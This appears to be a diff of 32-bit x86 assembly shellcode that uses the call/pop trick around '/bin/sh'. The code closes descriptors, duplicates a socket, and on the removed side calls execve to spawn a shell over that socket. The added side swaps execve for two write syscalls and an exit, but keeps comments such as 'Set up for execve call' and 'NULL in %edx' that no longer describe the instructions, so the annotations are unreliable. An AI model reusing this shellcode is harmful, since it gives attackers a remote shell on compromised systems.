@@ -13,21 +13,11 @@ function:
 	L2: 				
 
 	xorl %eax, %eax			# Setting eax to 0
-	xorl %ebx, %ebx
 
 	#closing stdin
-	movb %al, %bl
-	movb $0x6, %al			# Setting eax to 6 (close)
-	int $0x80
-
-	#closing stdout
+	xor %ebx, %ebx
 	movb $0x1, %bl
-	movb $0x6, %al
-	int $0x80
-
-	#closing stderr
-	movb $0x2, %bl	
-	movb $0x6, %al
+	movb $0x6, %al			# Setting eax to 6 (close)
 	int $0x80
 
 	#duplicating socket
@@ -42,19 +32,25 @@ function:
 	movb $0x29, %al	
 	int $0x80
 
-	# Writing "/bin/sh" to the standard ouput
-
-	popl %esi
 	xorl %eax, %eax
-	movb %al,0x7(%esi)		# NULL terminate /bin/sh
-	push %eax
-	push %esi
+	xorl %ebx, %ebx
+	xorl %edx, %edx
+	popl %esi
 
-	xorl	%edx, %edx		# NULL in %edx
-	movl	%esp, %ecx		# Address of array in %ecx
-	movl	%esi, %ebx		# Address of /bin/sh in %ebx
-	movb	$0xb, %al		# Set up for execve call in %eax
+	xorl	$0x7, %edx		# NULL in %edx
+	movl	%esi, %ecx		# Address of array in %ecx
+	movl	$0x1, %ebx		# Address of /bin/sh in %ebx
+	movb	$0x4, %al		# Set up for execve call in %eax
 	int	$0x80			# Jump to kernel mode
+
+	xorl	$0x7, %edx		# NULL in %edx
+	movl	%esi, %ecx		# Address of array in %ecx
+	movl	$0x4, %ebx		# Address of /bin/sh in %ebx
+	movb	$0x4, %al		# Set up for execve call in %eax
+	int	$0x80			# Jump to kernel mode
+
+	movb $0x1, %al
+	int	$0x80
 
 	L1: call L2
 	.string "/bin/sh"
